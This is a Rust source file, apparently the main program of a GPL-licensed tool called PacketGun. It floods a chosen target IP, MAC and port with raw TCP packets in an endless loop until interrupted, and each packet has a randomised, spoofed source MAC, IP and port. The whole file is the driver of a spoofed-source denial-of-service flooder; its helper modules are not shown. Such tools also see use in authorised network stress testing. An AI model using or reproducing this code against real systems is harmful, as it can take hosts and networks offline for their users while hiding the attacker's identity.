/*
 * Copyright (C) 2026 Oliver R. Calazans Jeronimo
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org>.
 */

mod generators;
mod models;
mod packets;
mod parser;
mod sockets;
mod utils;

use std::env;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::{net::Ipv4Addr, time::Instant};

use crate::models::{Iface, MAC};
use crate::parser::Args;
use crate::packets::{TcpPkt};
use crate::generators::RandomValues;
use crate::sockets::Layer2Socket;
use crate::utils::{CtrlCHandler};



fn main() {
    let args = parse_args();
    let mut packet_gun = PacketGun::new(args);
    packet_gun.execute();
}



fn parse_args() -> Args {
    let input: Vec<String> = env::args().collect();
    clap::Parser::parse_from(input)
}



pub struct PacketGun {
    tcp_build  : TcpPkt,
    iface      : Iface,
    pkts_sent  : usize,
    rand       : RandomValues,
    dst_ip     : Ipv4Addr,
    dst_mac    : MAC,
    dst_port   : u16,
    duration   : f64,
}



impl PacketGun {

    pub fn new(args: Args) -> Self {
        let iface = Iface::new(&args.iface);
        Self {
            tcp_build : TcpPkt::new(),
            pkts_sent : 0,
            rand      : RandomValues::new(),
            dst_ip    : args.dst_ip,
            dst_mac   : MAC::from_str(&args.dst_mac),
            dst_port  : args.port,
            duration  : 0.0,
            iface,
        }
    }



    pub fn execute(&mut self){
        self.display_info();
        self.send_endlessly();
        self.display_exec_info();
    }


    
    fn display_info(&self) {
        let dst_mac = self.dst_mac.to_string();

        println!("[i] IFACE: {}", self.iface);
        println!("[i] DST >> MAC: {} / IP: {}", dst_mac, self.dst_ip);
    }



    fn send_endlessly(&mut self) {
        let socket  = Layer2Socket::new(&self.iface);
        let running = Arc::new(AtomicBool::new(true));
        CtrlCHandler::setup(running.clone());

        println!("[+] Sending packets. Press CTRL + C to stop");
        let init = Instant::now();

        while running.load(Ordering::SeqCst) {
            let pkt = self.get_pkt();
            socket.send(pkt);

            self.pkts_sent += 1;
        }
        
        println!("\n[-] Flood interrupted");
        self.duration = init.elapsed().as_secs_f64();    
    }


    
    #[inline]
    fn get_pkt(&mut self) -> &[u8] {
        self.tcp_build.pkt(
            self.rand.random_mac(),
            self.rand.random_ip(),
            self.rand.random_port(),
            self.dst_mac, 
            self.dst_ip,
            self.dst_port,
        )
    }



    fn display_exec_info(&self) {
        println!("[%] {} packets sent in {:.2} seconds", &self.pkts_sent, self.duration);

        if self.duration > 1.0 {
            let rate = self.pkts_sent as f64 / self.duration;
            println!("[%] {:.2} packets sent per second", rate);
        };        
    }

}